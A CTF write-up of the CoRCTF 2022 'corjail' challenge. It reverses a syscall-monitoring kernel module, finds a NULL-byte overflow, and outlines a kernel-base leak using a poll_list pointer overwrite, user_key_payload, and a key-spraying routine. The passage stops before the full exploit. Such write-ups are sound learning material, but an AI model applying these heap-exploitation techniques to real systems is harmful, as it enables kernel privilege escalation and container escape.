<!-- Converted by md2hatena-rs -->
<div class="keywords"><span class="btitle">keywords</span>
<p>
kernel exploit / docker escape / poll_list / kROP on tty_struct / tty_file_private / setxattr
</p>
</div>
<div class="contents">[:contents]</div>
<p>////////////////////
JAPANESE ver is <a href="https://smallkirby.hatenablog.com/entry/corjail">HERE</a>
////////////////////</p>
<h3>1. Intro</h3>
<p>Hello, from inside a refrigerator. I’m a NEET.
Thesedays, I’ve benn working around front-end things, so its’s the time I feel I wanna pwning in reaction. However, I plan to go other new internship job for 3mo from this week, and I’m just barely able to keep my sanity in the face of various environment changes and the like. So, to experience more new things and to place more stress on me, let’s work on a docker escape pwn.
Today’s challenge is <strong>corjail</strong> from <strong>CoRCTF 2022</strong>. AFAIR, I solved a challenge from CoRCTF in a previous blog entry. I really like challenges from this CTF. This is my first docker escape challenge, so I’d like to write down points where I got stucked and I made mistakes.
Well, honestly, I cheated to look at the author’s writeup before working on the task. Note that I always take care that I don’t check the details of writeups before working on it by myself. Without reading the detailed explanation or exploit code, I just pick up keywords or something, and think how I can use these keywords. Even if I cheat, the fun would be lost if I read everything in the writeup. In this entry, I would include debugging process such as my trial-and-errors or points I got stucked.</p>
<h3>2. devenv setup</h3>
<p>First, clone the repo from <a href="https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build">GitHub</a>.
There are so many distributed files, so take five minutes to play Smash.
Then, build the kernel image using <code>build_kernel.sh</code> (the script uses only single core, leading to never-ending build. I recommend to modify it with <code>make -jXXX</code>).
During the build, I encountered SSL-related error, so I disabled <code>MODULE_SIG_ALL</code> without any concern.
After that, generate a guest filesystem using <code>build_image.sh</code>. The script does many things, so you should check if the script does not harm your environment. It would generate <code>build/coros/coros.qcow2</code>. QCOW format file can be mount/unmount-ed using below script:</p>
<div class="codeblock-title">mount.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">### mount.bash
#!/bin/bash
set -eu

MNTPOINT=/tmp/hoge
QCOW=$(realpath &quot;${PWD}&quot;/../build/coros/coros.qcow2)

sudo modprobe nbd max_part=8
mkdir -p $MNTPOINT
sudo qemu-nbd --connect=/dev/nbd0 &quot;$QCOW&quot;
sudo fdisk -l /dev/nbd0
sudo mount /dev/nbd0 $MNTPOINT

### umount.bash
#!/bin/bash

set -eu
MNTPOINT=/tmp/hoge

sudo umount $MNTPOINT || true
sudo qemu-nbd --disconnect /dev/nbd0
sudo rmmod nbd
</code></pre>
<p>Okay, let me check the init flow first. Looking at the filesystem mounted by above script, you can see <code>/etc/inittab</code>:</p>
<div class="codeblock-title">inittab</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
</code></pre>
<p>Nothing to say. Next, you can see <code>/etc/init.d/docker</code> which is the service script of docker daemon, but I just skip it cuz it’s really normal. In <code>/etc/systemd/system/init.service</code>, below service is registered:</p>
<div class="codeblock-title">/etc/systemd/system/init.service</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">[Unit]
Description=Initialize challenge

[Service]
Type=oneshot
ExecStart=/usr/local/bin/init

[Install]
WantedBy=multi-user.target
</code></pre>
<p><code>/usr/local/bin/init</code> specified as <code>ExecStart</code> looks like below:</p>
<div class="codeblock-title">/usr/local/bin/init.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">#!/bin/bash

USER=user

FLAG=$(head -n 100 /dev/urandom | sha512sum | awk '{printf $1}')

useradd --create-home --shell /bin/bash $USER

echo &quot;export PS1='\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# '&quot;  &gt;&gt; /root/.bashrc
echo &quot;export PS1='\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '&quot; &gt;&gt; /home/$USER/.bashrc

chmod -r 0700 /home/$USER

mv /root/temp /root/$FLAG
chmod 0400 /root/$FLAG
</code></pre>
<p>It creates new user(<code>user</code>), makes PS1 fancy, then changes permission of <code>flag</code>. <code>/etc/password</code> looks like:</p>
<div class="codeblock-title">/etc/passwd</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">root:x:0:0:root:/root:/usr/local/bin/jail
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(snipped...)
</code></pre>
<p>Login shell of <code>root</code> is <code>/usr/local/bin/jail</code>:</p>
<div class="codeblock-title">/usr/local/bin/jail.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">#!/bin/bash

echo -e '[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...'
/usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp=/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer
/usr/sbin/poweroff -f
</code></pre>
<p>After starting up docker container as <code>user</code>, it just <code>poweroff</code>. This seems the main point of init flow. It sets <code>--security-opt seccomp=/etc/docker/corjail.json</code>, which we would check later.
Strange procfs named <code>/proc/common</code> is bind-mounted, which we would also check later.
Okay, we now know that we can change login shell of <code>root</code> to <code>/bin/bash</code> in <code>/etc/password</code> if we wanna work in shell of guest OS(not on docker) for debug.
The result of <code>docker images</code> as <code>root</code> is below:</p>
<div class="codeblock-title">.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">root@CoROS:~# docker images
REPOSITORY     TAG             IMAGE ID       CREATED        SIZE
corcontainer   latest          8279763e02ce   2 months ago   84.7MB
debian         bullseye-slim   c9cb6c086ef7   3 months ago   80.4MB
</code></pre>
<p>We can see the image named <code>corcontainer</code>, which was used in <code>jail</code> script. <code>build_image.sh</code> says:</p>
<div class="codeblock-title">build_image.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">tar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker
cp -rp coros/files/docker/var/lib/docker $FS/var/lib/
rm -rf coros/files/docker/var
</code></pre>
<p>The docker image seems to be generated beforehand. We want to place the latest exploit in a docker container on guest OS, so let me change <code>/usr/local/bin/jail</code> as below:</p>
<div class="codeblock-title">/usr/local/bin/jail.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">#!/bin/bash

echo -e '[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...'
cp /exploit /home/user || echo &quot;[!] exploit not found, skipping&quot;
chown -R user:user /home/user
echo 0 &gt; /proc/sys/kernel/kptr_restrict
/usr/bin/docker run -it --user root \
  --hostname CoRJail \
  --security-opt seccomp=/etc/docker/corjail.json \
  --add-cap CAP_SYSLOG \
  -v /proc/cormon:/proc_rw/cormon:rw \
  -v /home/user/:/home/user/host \
  corcontainer
/usr/sbin/poweroff -f
</code></pre>
<p>Then we place <code>exploit</code> in guest filesystem, and the script above would automatically place it at <code>/home/user/exploit</code> in a docker container. We also add <code>--add-cap CAP_SYSLOG</code> to the docker run command, which is required to use <code>/proc/kallsyms</code>.
By the way, <a href="https://github.com/smallkirby/lysithea">lysithea</a> would take care of all the tiny boring things except for first-time setup. So you can just run below command:</p>
<div class="codeblock-title">lysithea.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">lysithea init # first time only
lysithea extract # first time only
lysithea local
</code></pre>
<h3>3. static analysis</h3>
<h4>misc</h4>
<p><a href="https://github.com/smallkirby/lysithea">lysithea</a> says:</p>
<div class="codeblock-title">lysithea.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">root@CoRJail:/home/user/host# ./drothea --verbose
Drothea v1.0.0
[.] kernel version:
        Linux version 5.10.127 (root@VPS) (gcc (Debian 8.3.0-6) 8.3.0, GNU ld (GNU Binutils for Debian) 2.31.1) #2 SMP Thu January 1 00:00:00 UTC 2030
[-] CONFIG_KALLSYMS_ALL is enabled.
[!] unprivileged ebpf installation is enabled.
cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory
[-] unprivileged userfaultfd is disabled.
[?] KASLR seems enabled. Should turn off for debug purpose.
[?] kptr seems restricted. Should try 'echo 0 &gt; /proc/sys/kernel/kptr_restrict' in init script.
root@CoRJail:/home/user/host# ./ingrid --verbose
Ingrid v1.0.0
[-] userfualtfd is disabled.
[-] CONFIG_DEVMEM is disabled.
</code></pre>
<p>All the basic security mitigation is enabled. Reading build-script(<code>build_kernel.sh</code>) of the kernel, you can see below patch:</p>
<div class="codeblock-title">patch.diff</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-diff">diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c
--- a/arch/x86/entry/syscall_64.c	2022-06-29 08:59:54.000000000 +0200
+++ b/arch/x86/entry/syscall_64.c	2022-07-02 12:34:11.237778657 +0200
@@ -17,6 +17,9 @@
 
 #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,
 
+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);
+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);
+
 asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
 	/*
 	 * Smells like a compiler bug -- it doesn't work
diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h
--- a/arch/x86/include/asm/syscall_wrapper.h	2022-06-29 08:59:54.000000000 +0200
+++ b/arch/x86/include/asm/syscall_wrapper.h	2022-07-02 12:34:11.237778657 +0200
@@ -219,9 +220,41 @@
 
 #define SYSCALL_DEFINE_MAXARGS	6
 
-#define SYSCALL_DEFINEx(x, sname, ...)				\
-	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\
-	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)
+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);
+
+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \
+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));
+
+#define __SYSCALL_COUNT(syscall_nr) \
+	this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])
+
+#define SYSCALL_COUNT_FUNCx(sname, x, ...)					\
+	{									\
+		__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);		\
+		return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));	\
+	}									\
+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))
+
+#define SYSCALL_COUNT_DECLARE0(sname) \
+	static inline long __count_sys_##sname(void);
+
+#define SYSCALL_COUNT_FUNC0(sname)					\
+	{								\
+		__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);	\
+		return __count_sys_##sname();				\
+	}								\
+	static inline long __count_sys_##sname(void)
+
+#define SYSCALL_DEFINEx(x, sname, ...)			\
+	SYSCALL_METADATA(sname, x, __VA_ARGS__)		\
+	SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)	\
+	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)	\
+	SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)
+
+#define SYSCALL_DEFINE0(sname)		\
+	SYSCALL_COUNT_DECLARE0(sname)	\
+	__SYSCALL_DEFINE0(sname)	\
+	SYSCALL_COUNT_FUNC0(sname)

(snpped...)
</code></pre>
<p>This seems to be <a href="https://lwn.net/Articles/896474/">a patch to add syscall analytics to procfs</a>. As you can see, the patch adds per-cpu variable named <code>__per_cpu_syscall_count</code> and counts the number of each syscalls.</p>
<h4>module analysis (rev)</h4>
<p>Next, let me look into the main part, kernel module named <code>cormon.ko</code>. And then, I noticed that source code is not distributed!!! Okay, the organizer seems to be a bit too clumsy to forget attaching source code, I believe. Well, there’s no other way, let’s reverse the module using Ghidra. Decompiled module with little prettifying is as follows:</p>
<div class="codeblock-title">decompiled.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">char *initial_filter = &quot;sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv,sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare&quot;;

struct proc_ops cormon_proc_ops = {
  .proc_open = cormon_proc_open,
  .proc_write = cormon_proc_write,
  .proc_read = seq_read,
};

struct seq_operations cormon_seq_ops = {
  .start = cormon_seq_start,
  .stop = cormon_seq_stop,
  .next = cormon_seq_next,
  .show = cormon_seq_show,
};

int init_module(void) {
  printk(&quot;6[CoRMon::Init] Initializing module...\n&quot;);
  if (proc_create(&quot;cormon&quot;, 0x1B5, 0, cormon_proc_ops) != 0) {
    return -0xC;
  }
  if (update_filter(initial_filter) != 0) {
    return -0x16;
  }
  
  printk(&quot;3[CoRMon::Error] proc_create() call failed!\n&quot;);
  return 0;
}

void cormon_proc_open(struct *inode inode, struct file *fp) {
  seq_open(fp, cormon_seq_ops);
  return;
}

ssize_t cormon_proc_write(struct file *fp, const char __user *ubuf, size_t size, loff_t *offset) {
  size_t sz;
  char *heap;
  if (*offset &lt; 0) return 0xffffffffffffffea;
  if (*offset &lt; 0x1000 &amp;&amp; size != 0) {
    if (0x1000 &lt; size) sz = 0xFFF;
    heap = kmem_cache_alloc_trace(?, 0xA20, 0x1000);
    printk(&quot;6[CoRMon::Debug] Syscalls @ %#llx\n&quot;);
    if (heap == NULL) {
      printk(&quot;3[CoRMon::Error] kmalloc() call failed!\n&quot;);
      return 0xfffffffffffffff4;
    }
    if (copy_from_user(heap, ubuf, sz) != 0) {
      printk(&quot;3[CoRMon::Error] copy_from_user() call failed!\n&quot;);
      return 0xfffffffffffffff2;
    }
    heap[sz] = NULL;
    if (update_filter(heap)) {
      kfree(heap);
    } else {
      kfree(heap);
      return 0xffffffffffffffea;
    }
  }
  return 0;
}

long update_filter(char *syscall_str) {
  char *syscall;
  int syscall_nr;
  char syscall_list[?] = {0};
  
  while(syscall = strsep(syscall, &quot;,&quot;) &amp;&amp; syscall != NULL &amp;&amp; syscall_str != NULL) {
    if((syscall_nr = get_syscall_nr(syscall)) &lt; 0) {
      printk(&quot;3[CoRMon::Error] Invalid syscall: %s!\n&quot;, syscall);
      return 0xffffffea;
    }
    syscall_list[syscall_nr] = 1;
  }
  
  memcpy(filter, syscall_list, 0x37 * 8);
}

int cormon_seq_show(struct seq_file *sfp, void *vp) {
  ulong v = *vp;
  if (v == 0) {
    int n = -1;
    seq_putc(sfp, 0xA);
    while((n = cpumask_next(n, &amp;__cpu_online_mask)) &lt; _nr_cpu_ids) { // for_each_cpu macro?
      seq_printf(sfp, &quot;%9s%d&quot;, &quot;CPU&quot;, n);
    }
    seq_printf(sfp, &quot;\tSyscall (NR)\n\n&quot;);
  }
  
  if (filtter[v] != 0) {
    if((name = get_syscall_name(v)) == 0) return 0;
    int n = -1;
    while((n = cpumask_next(n, &amp;__cpu_online_mask)) &lt; _nr_cpu_ids) {
      seq_printf(sfp, &quot;%10sllu&quot;, &quot;CPU&quot;, __per_cpu_syscall_count[v]); // PER_CPU macro?
    }
    seq_printf(sfp, &quot;\t%s (%lld)\n&quot;, name, v);
  }
  if (v == 0x1B9) seq_putc(sfp, 0xA);
  
  return 0;
}

void* cormon_seq_next(struct seq_file *fp, void *v, loff_t *pos_p) {
  loff_t pos = *pos_p;
  *pos_p++;
  if (pos &lt; 0x1BA) return pos_p;
  return 0;
}

void* cormon_seq_stop(struct seq_file *fp, void *v) {
  return NULL;
}

void* cormon_seq_start(struct seq_file *fp, loff_t *pos_p) {
  if (*pos_p &lt; 0x1BA) return pos_p;
  else return 0;
}
</code></pre>
<p>Reversing itself is not so hard cuz the module is simple.
It just creates an interface to display per-CPU variable named <code>__per_cpu_syscall_count</code>, which is introduced by the above patch.
This counter is incremented at the beginning of patched syscall by <code>__SYSCALL_COUNT()</code>. This increment is done for all syscalls regardless of <code>filter</code>.
<code>cormon</code> module <code>read</code> the file under <code>proc</code> to display statistics of syscalls filtered by <code>filter</code>. Also, it can update <code>filter</code> by writing to the proc file. The filter can be updated by writing comma-separated syscall names to <code>/proc_rw/cormon</code> (At the startup of docker, host <code>/proc/cormon</code> is bind-mounted to <code>/proc_rw/cormon</code>).</p>
<p>Here’s what it looks like:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="CoROS, actually Debian BullsEye"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163359.png" alt="CoROS, actually Debian BullsEye" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">CoROS, actually Debian BullsEye</figcaption></figure></p>
<h4>seccomp</h4>
<p>In <code>seccomp.json</code> (which is later copied inside VM as <code>corjail.json</code>), the filter is set as <code>defaultAction: SCMP_ACT_ALLOW</code>:</p>
<div class="codeblock-title">seccomp.json</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-json">{
	&quot;defaultAction&quot;: &quot;SCMP_ACT_ERRNO&quot;,
	&quot;defaultErrnoRet&quot;: 1,
	&quot;syscalls&quot;: [
		{
            &quot;names&quot;: [ &quot;_llseek&quot;, &quot;_newselect&quot;, (snipped...)],
			&quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;
		},
		{
			&quot;names&quot;: [ &quot;clone&quot; ],
			&quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;,
			&quot;args&quot;: [ { &quot;index&quot;: 0, &quot;value&quot;: 2114060288, &quot;op&quot;: &quot;SCMP_CMP_MASKED_EQ&quot; } ]
		}
	]
}

</code></pre>
<p>Disallowed syscalls looks like below (this is just a result of rough comparision, so there would be some mistakes):</p>
<div class="codeblock-title">disallowed.txt</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">msgget
msgsnd
msgrcv
msgctl
ptrace
syslog
uselib
personality
ustat
sysfs
vhangup
pivot_root
_sysctl
chroot
acct
settimeofday
mount
umount2
swapon
swapoff
reboot
sethostname
setdomainname
iopl
ioperm
create_module
init_module
delete_module
get_kernel_syms
query_module
quotactl
nfsservctl
getpmsg
putpmsg
afs_syscall
tuxcall
security
lookup_dcookie
clock_settime
vserver
mbind
set_mempolicy
get_mempolicy
mq_open
mq_unlink
mq_timedsend
mq_timedreceive
mq_notify
mq_getsetattr
kexec_load
request_key
migrate_pages
unshare
move_pages
perf_event_open
fanotify_init
name_to_handle_at
open_by_handle_at
setns
process_vm_readv
process_vm_writev
kcmp
finit_module
kexec_file_load
bpf
userfaultfd
pkey_mprotect
pkey_alloc
pkey_free
</code></pre>
<p>Note that <code>unshare, mount, msgget, msgsnd, userfaultfd, bpf</code> are prohibited.</p>
<p>FYI, when I tried to run a exploit binary built as static including pthread on Ubuntu 22.04, it failed saying <code>Operation not permitted</code>.
It seems that <a href="https://blog.jp.square-enix.com/iteng-blog/posts/00016-wsl2-gui-seccomp-issue/">Docker doesn’t have features to report blocked syscalls</a>, I had to find out a syscall which invokes the error.
As a result, it seems that <code>clone3</code> syscall is the cause of the error. So I applied below patch to <code>seccomp.json</code> (as far as I look into the writeup, use of pthread is intended, so this would be due to the difference of environment or impl of pthread…?)</p>
<div class="codeblock-title">seccomp.patch</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-patch">--- a/../build/coros/files/docker/seccomp.json
+++ b/./seccomp.json
@@ -10,6 +10,10 @@
                        &quot;names&quot;: [ &quot;clone&quot; ],
                        &quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;,
                        &quot;args&quot;: [ { &quot;index&quot;: 0, &quot;value&quot;: 2114060288, &quot;op&quot;: &quot;SCMP_CMP_MASKED_EQ&quot; } ]
+               },
+               {
+                       &quot;names&quot;: [ &quot;clone3&quot; ],
+                       &quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;
                }
        ]
 }
</code></pre>
<h3>4. Vuln: NULL-byte overflow</h3>
<p>The bug is apparent from the decompiiled code:
<code>cormon_proc_write()</code> copies user-supplied syscall string into <code>heap</code>(kmalloc-4k). Then it NULL-terminates <code>heap</code>. But if <code>size</code> is <code>0x1000</code>, it leads to NULL-byte overflow:</p>
<div class="codeblock-title">.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">common_proc_write() {
  if (0x1000 &lt; size) sz = 0xFFF;
  if (copy_from_user(heap, ubuf, sz) != 0) {...}
  ...
  heap[sz] = NULL;
  ...
}
</code></pre>
<p><code>kmalloc-4k</code> slab cache is used here. Looking into <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">references</a>, there seems to be some useful structures. However, in this challenge, most common syscalls are filtered and there are no useful candidates in this list. I haven’t been following up kernelpwn for a while, and I gave up! I cheated here to look through author’s writeup. Viva cheating!</p>
<h3>5. pre-requisites</h3>
<h4><code>sys_poll</code></h4>
<p>It seems <code>sys_poll()</code> is useful. Source code around it looks as follow (non-related code is omitted):</p>
<div class="codeblock-title">fs/select/select.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">#define FRONTEND_STACK_ALLOC	256
#define POLL_STACK_ALLOC	FRONTEND_STACK_ALLOC
#define N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / \
			sizeof(struct pollfd))
#define POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))            
struct pollfd {
	int fd;
	short events;
	short revents;
}; /* size: 8, cachelines: 1, members: 3 */
struct poll_list {
	struct poll_list *next;
	int len;
	struct pollfd entries[];
}; /* size: 16, cachelines: 1, members: 3 */

static int do_sys_poll(struct pollfd __user *ufds, unsigned int nfds,
		struct timespec64 *end_time)
{
	struct poll_wqueues table;
	long stack_pps[POLL_STACK_ALLOC/sizeof(long)];
	struct poll_list *const head = (struct poll_list *)stack_pps;
 	struct poll_list *walk = head;

	len = min_t(unsigned int, nfds, N_STACK_PPS);
	for (;;) {
		walk-&gt;next = NULL;
		walk-&gt;len = len;
		if (!len)
			break;

		if (copy_from_user(walk-&gt;entries, ufds + nfds-todo,
					sizeof(struct pollfd) * walk-&gt;len))
			goto out_fds;

		todo -= walk-&gt;len;
		if (!todo)
			break;

		len = min(todo, POLLFD_PER_PAGE);
		walk = walk-&gt;next = kmalloc(struct_size(walk, entries, len),
					    GFP_KERNEL);
		if (!walk) {
			err = -ENOMEM;
			goto out_fds;
		}
	}

	fdcount = do_poll(head, &amp;table, end_time);

	err = fdcount;
out_fds:
	walk = head-&gt;next;
	while (walk) {
		struct poll_list *pos = walk;
		walk = walk-&gt;next;
		kfree(pos);
	}

	return err;
}
</code></pre>
<p>First, it copies user-supplied <code>pollfd</code> list to <code>stack_pps</code> in the stack up to 256bytes. Strictly speaking, it copies up to 240bytes excluding 16bytes of <code>next</code> and <code>len</code> member onto the stack (in other words, 30 <code>struct pollfd</code>s).
If more than <code>ufds</code> are supplied by user, it then <code>kmalloc()</code>s and copies them up to the size of <code>POLLFD_PER_PAGE</code> (<code>(4096-16)/8 == 510</code>). In short, the type of slab cache used here is between kmalloc-32 ~ kmalloc-4k (~kmalloc-16 is never used due to 16bytes of <code>next</code> and <code>len</code> member).
After copying user-supplied <code>poll_list</code> and <code>pollfd</code> to 256bytes of stack and 32~4k heap, it creates a single-linked list linked by <code>next</code> pointer. When freeing, it simply <code>kfree()</code>s the list in order from the head.
I see. This structure can have a pointer pointing to the cache of arbitrary size between kmalloc-32~4k. In addition, you can <code>kfree</code> them by timer expiration, or by arbitrary events you can control. Really useful structure.</p>
<p>Using NULL-byte overflow stated above, we can partially overwrite <code>next</code> pointer in <code>struct pollfd</code>, leading to UAF(read) of object pointed to by overwritten pointer.
The problem is that <code>msgXXX</code> syscall is now filtered out. So which structure can we use to leak symbols?</p>
<h4><code>add_key</code> / <code>keyctl</code> syscall</h4>
<p>Yeah ofcourse I cheated. I heard that <code>add_key</code> syscall is useful. I didn’t know about the syscall.
Speaking of which, looking through <a href="https://docs.docker.com/engine/security/seccomp/">default seccomp filter of docker</a>, <code>add_key</code> syscall is filtered out, while it is allowed in this challenge. Source code of <code>add_key</code> looks like:</p>
<div class="codeblock-title">fs/select.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">// security/keys/user_defined.c
struct key_type key_type_user = {
	.name			= &quot;user&quot;,
	.preparse		= user_preparse,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,
	.update			= user_update,
	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,
	.read			= user_read,
};
int user_preparse(struct key_preparsed_payload *prep)
{
  struct user_key_payload *upayload;
  size_t datalen = prep-&gt;datalen;

  if (datalen &lt;= 0 || datalen &gt; 32767 || !prep-&gt;data)
      return -EINVAL;

  upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
  ...
}

// security/keys/keyctl.c
SYSCALL_DEFINE5(add_key, const char __user *, _type,
		const char __user *, _description, const void __user *, _payload,
		size_t, plen, key_serial_t, ringid)
{
  key_ref_t keyring_ref, key_ref;
  char type[32], *description;
  void *payload;
  long ret;

  /* draw all the data into kernel space */
  ret = key_get_type_from_user(type, _type, sizeof(type));
  description = NULL;
  if (_description) {...}

  /* pull the payload in if one was supplied */
  payload = NULL;

  if (plen) {
      ...
      if (copy_from_user(payload, _payload, plen) != 0)
          goto error3;
  }

  keyring_ref = lookup_user_key(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);
  key_ref = key_create_or_update(keyring_ref, type, description,
                     payload, plen, KEY_PERM_UNDEF, KEY_ALLOC_IN_QUOTA);
  ...
}

// security/keys/key.c
key_ref_t key_create_or_update(key_ref_t keyring_ref,
			       const char *type,
			       const char *description,
			       const void *payload,
			       size_t plen,
			       key_perm_t perm,
			       unsigned long flags)
{
  struct keyring_index_key index_key = {
      .description	= description,
  };
  struct key_preparsed_payload prep;                       
    
  index_key.type = key_type_lookup(type);
  memset(&amp;prep, 0, sizeof(prep));
  ...
  if (index_key.type-&gt;preparse) {
      ret = index_key.type-&gt;preparse(&amp;prep);
      ...
  }
  ...
  ret = __key_instantiate_and_link(key, &amp;prep, keyring, NULL, &amp;edit);
  ...
}
</code></pre>
<p>Okay. <a href="https://man7.org/linux/man-pages/man2/add_key.2.html">manpage</a> says that there are 4 types of keys: <code>kerying</code>, <code>user</code>, <code>logon</code>, and <code>bigkey</code>.
Each key type has each <code>struct key_type</code> structure like <code>fops</code> of VFS. <code>.preparse()</code> function, which is a member of this handler and parses user-given payload, is identical with <code>user_preparse()</code> when the key type is <code>user</code>.
<code>user_preparse()</code> <code>kmalloc</code>s struct <code>user_key_payload</code>. This structure can have variable size and can be up to <code>sizeof(struct user_key_payload) + 32767</code> bytes under control of user.
Users can also <code>kfree</code> it at any desirable time (<a href="https://man7.org/linux/man-pages/man3/keyctl_revoke.3.html"><code>keyctl_revoke</code></a>) (Note: this sentence is a little bit wrong. Explained later).
Great structure, really. How the hell do pwners find such a useful kernel structures… In addition, it should be noted that <strong>the value of the first member in this structure, <code>rcu</code>, is kept untouched til it is initialized</strong>. Fu~~~.</p>
<h3>6. kbase leak via <code>user_key_payload</code> and <code>seq_operations</code></h3>
<p>Now, it seems we can leak kbase using these staff. Let me explain about the overview without details first.</p>
<p>In preparation, we call <code>add_key</code> syscall to place <code>struct user_key_payload</code> in kmalloc-32.
Then, we call <code>poll</code> for 542 fds (30 in stack + 510 in kmalloc-4k + 2 in kmalloc-32). Then, a list in <code>struct poll_list</code> is constructed as <code>stack --&gt; kmalloc-4k --&gt; kmalloc-32</code>. After that, we write to the module’s block file to invoke <code>cormon_proc_write()</code>, which ends in NULL-byte overflow. The buffer of this function is allocated in <code>kmalloc-4k</code>, so if the conditions are met, the last byte of <code>poll_list.next</code> pointer in kmalloc-4k is partially overwritten. If the addr is desirable, overwritten pointer would point to <code>user_key_payload</code>, which we prepared in the first step.
Then, we free <code>poll_list</code> (both timer expiration and event trigger is okay) to <code>kfree</code>s <code>user_key_payload</code> linked to the list of <code>poll_list</code>. Now, UAF of <code>user_key_payload</code> is achieved.
To leak kbase, we allocate <code>seq_operations</code> or something on the <code>user_key_payload</code>. Finally, we just read payload of the key via <code>keyctl_read</code>. kbase is leaked.
When we think about these scenario, it seems pretty easy. But I wrote that <em>if conditions are met</em>. So we have to make the conditions met. I believe kheap spraying is enough, hopefully.</p>
<p>Okay, let me go through in order.
First, place keys in kmalloc-32 by <code>add_key()</code>. Note that there are no glibc wrapper for <code>add_key</code> syscall, so you have to install a package like <code>libkeyutils-dev</code>, and then build an exploit with <code>-lkeyutils</code>.
Spray keys like below:</p>
<div class="codeblock-title">spray_keys.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">void spray_keys() {
  char *desc = calloc(0x100, 1);
  if (desc &lt;= 0) errExit(&quot;spray_keys malloc&quot;);
  strcpy(desc, DESC_KEY_TOBE_OVERWRITTEN_SEQOPS);

  for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) {
    memcpy(desc + strlen(DESC_KEY_TOBE_OVERWRITTEN_SEQOPS), &amp;ix, 4);
    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    memset(key_payload, 'A', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    key_serial_t keyid0 = add_key(&quot;user&quot;, desc, key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, KEY_SPEC_PROCESS_KEYRING);
    if (keyid0 &lt; 0) errExit(&quot;add_key 0&quot;);
  }
}
</code></pre>
<p>Then, you can find our target objects in kmalloc-32 heap (using <code>pt -ss AAAAAAAA -align 8</code>). This would be <code>kmalloc-32</code>. We can confirm it by the payload <code>AAAAAAAA</code> we prepared as a needle, and the fact that the previous short value is <code>0x08</code>(<code>ushort datalen</code>).
